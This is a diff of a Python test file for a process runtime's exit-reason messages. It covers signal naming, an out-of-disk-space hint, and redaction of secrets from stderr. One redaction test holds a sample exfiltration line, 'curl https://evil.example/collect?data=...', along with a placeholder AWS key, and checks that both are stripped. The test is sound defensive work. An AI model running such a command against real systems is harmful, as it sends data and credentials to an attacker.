@@ -24,6 +24,7 @@ lines; the subprocess and stdin are mocked (no kiro-cli is launched).
 import asyncio
 import gc
 import json
+import logging
 import os
 import time
 import weakref
@@ -2574,7 +2575,15 @@ async def test_reader_crash_on_a_running_child_does_not_print_returncode_none(ca
 
 
 @pytest.mark.asyncio
-async def test_exit_reason_appends_last_nonempty_stderr_line():
+async def test_exit_reason_does_not_promote_the_last_stderr_line_to_a_cause():
+    """A child's last word is not why it died.
+
+    ``Error: failed to create sandbox dir`` describes no death -- it is whatever
+    the child happened to flush last -- so the reason stays the exit status and
+    the line is kept at debug. Pasting such a line as the cause is what puts
+    ``HTTP 404 Not Found`` on the card of a death that was in fact an ordinary
+    SIGTERM teardown.
+    """
     rt, reader, proc = _make_runtime()
     proc.returncode = 1
     rt._stderr_lines = ["warming up", "Error: failed to create sandbox dir", "   "]
@@ -2588,9 +2597,20 @@ async def test_exit_reason_appends_last_nonempty_stderr_line():
     finally:
         await _stop_reader(task)
     msg = str(ei.value)
-    assert msg.startswith("process exited (rc=1): Error: failed to create sandbox dir")
+    assert msg == "process exited (rc=1)"
+    assert "sandbox dir" not in msg
     assert "warming up" not in msg
     assert "kirocrew doctor" not in msg
+
+
+def test_exit_reason_names_the_signal_that_ended_the_child():
+    """A negative returncode is POSIX's ``-signum``, and the number alone is the
+    part an operator has to look up -- while ``signal SIGTERM`` says plainly that
+    something ASKED the process to stop, which is what the fleet's deaths were."""
+    rt, _reader, _proc = _make_runtime()
+    assert rt._exit_reason(-15) == "process exited (rc=-15 (signal SIGTERM))"
+    assert rt._exit_reason(-9) == "process exited (rc=-9 (signal SIGKILL))"
+    assert rt._exit_reason(1) == "process exited (rc=1)"
 
 
 def test_exit_reason_without_stderr_is_unchanged():
@@ -2611,42 +2631,71 @@ def test_exit_reason_enospc_points_at_doctor():
     assert "kirocrew doctor" in rt._exit_reason(1)
 
 
-def test_exit_reason_redacts_credentials_and_exfil_urls_in_the_tail():
+def test_exit_reason_finds_a_signature_that_is_not_the_last_line():
+    """Which line a child flushed last is a race with its own buffering, so the
+    signature is searched over the whole retained tail."""
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = [
+        "mkdir: cannot create directory: No space left on device",
+        "shutting down",
+    ]
+    assert "kirocrew doctor" in rt._exit_reason(1)
+
+
+def test_exit_reason_redacts_credentials_and_exfil_urls_in_a_proven_cause():
+    """Redaction is unconditional and lands BEFORE the cut, so a long line
+    cannot leave a secret's first half in the shown prefix. Asserted on a line
+    that DOES earn the cause slot, since that is the text the card carries."""
     import kiro_crew.acp.runtime as rt_mod
 
     rt, _reader, _proc = _make_runtime()
     payload = "A" * 80
     rt._stderr_lines = [
-        f"auth failed: curl https://evil.example/collect?data={payload} "
+        f"No space left on device: curl https://evil.example/collect?data={payload} "
         "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
     ]
     msg = rt._exit_reason(1)
     assert "AKIAIOSFODNN7EXAMPLE" not in msg
     assert payload not in msg
-    assert "auth failed" in msg
-    # The cut lands AFTER redaction, so a long line cannot leave a secret's
-    # first half in the shown prefix.
-    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"]
+    assert "No space left on device" in msg
+    rt._stderr_lines = [
+        "No space left on device "
+        + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4)
+        + " AKIAIOSFODNN7EXAMPLE"
+    ]
     assert "AKIAIOSFODNN7" not in rt._exit_reason(1)
 
 
-def test_exit_reason_tail_is_bounded_to_one_line():
+def test_exit_reason_redacts_the_demoted_tail_too(caplog):
+    """The debug log is a real sink, so the line demoted to it is redacted on
+    the same pass -- a secret must not survive by being merely unpromoted."""
+    rt, _reader, _proc = _make_runtime()
+    with caplog.at_level(logging.DEBUG, logger="kiro_crew.acp.runtime"):
+        rt._stderr_lines = ["boom Authorization: Bearer AKIAIOSFODNN7EXAMPLE"]
+        rt._exit_reason(1)
+    assert "exit stderr tail" in caplog.text
+    assert "AKIAIOSFODNN7EXAMPLE" not in caplog.text
+
+
+def test_exit_reason_cause_is_bounded_to_one_line():
     from kiro_crew.acp import runtime as rt_mod
 
     assert rt_mod._STDERR_REASON_TAIL_CHARS == 200
     rt, _reader, _proc = _make_runtime()
-    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
+    lead = "No space left on device "
+    rt._stderr_lines = [lead + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
     msg = rt._exit_reason(1)
-    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + 64
-    assert msg.endswith("…")
+    assert "…" in msg
+    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + len(rt_mod._ENOSPC_HINT) + 80
     # Exactly at the cap nothing is cut.
-    rt._stderr_lines = ["y" * rt_mod._STDERR_REASON_TAIL_CHARS]
-    assert not rt._exit_reason(1).endswith("…")
+    rt._stderr_lines = [lead.ljust(rt_mod._STDERR_REASON_TAIL_CHARS, "y")]
+    assert "…" not in rt._exit_reason(1)
 
 
 def test_exit_reason_enospc_hint_survives_the_tail_cap():
-    """The signature is matched on the whole line: a marker past the cap
-    still points at the doctor even though the card shows only the head."""
+    """The signature is matched on the whole line and the HINT is appended after
+    the cut, so a line long enough to be trimmed cannot push the operator's
+    pointer out of the message that pointer is the whole purpose of."""
     from kiro_crew.acp import runtime as rt_mod
 
     rt, _reader, _proc = _make_runtime()
